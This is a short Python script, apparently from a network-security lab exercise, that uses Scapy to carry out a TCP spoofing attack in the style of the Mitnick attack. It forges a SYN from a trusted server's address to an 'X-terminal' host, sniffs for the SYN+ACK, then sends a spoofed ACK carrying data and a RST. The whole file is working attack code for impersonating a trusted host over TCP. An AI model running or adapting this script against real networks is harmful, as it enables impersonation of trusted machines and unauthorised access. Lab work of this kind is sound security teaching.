#!/usr/bin/python3

from scapy.all import *
import time

x_ip = "10.9.0.5"
x_port = 9090
srv_ip = "10.9.0.6"
srv_port = 8000
syn_seq = 0x1000
my_iface = 'br-d9036100a889'
f = 'tcp and src host {A} and dst host {B}'
my_filter = f.format( A=x_ip, B=srv_ip )

def spoof(pkt):
	old_tcp = pkt[TCP]
	
	if old_tcp.flags=='SA':
		print("SYN+ACK from X-terminal")
		print("Sending spoofed ACK")
		ip = IP( src=srv_ip, dst=x_ip )
		tcp = TCP( sport=srv_port, dport=x_port, seq=syn_seq+1, ack=old_tcp.seq+1, flags='A' )
		data = 'Hello victim\n'

		spoofed_pkt = ip/tcp/data
		send( spoofed_pkt,verbose=0 )

		print("Sending RST packet")
		time.sleep(2)
		tcp.flags = 'R'
		tcp.seq = syn_seq+1+len(data)
		rst_tcp_pkt = ip/tcp
		send( rst_tcp_pkt,verbose=0 )
		
def spoofing_SYN():
	print("Sending spoofed SYN")
	ip = IP( src=srv_ip, dst=x_ip )
	tcp = TCP( sport=srv_port, dport=x_port, seq = syn_seq, flags='S' )
	spoofed_syn_pkt = ip/tcp
	send( spoofed_syn_pkt, verbose=1 )

def main():
	spoofing_SYN()
	sniff( iface=my_iface,filter=my_filter,prn=spoof )	

if __name__ == "__main__":
	main()
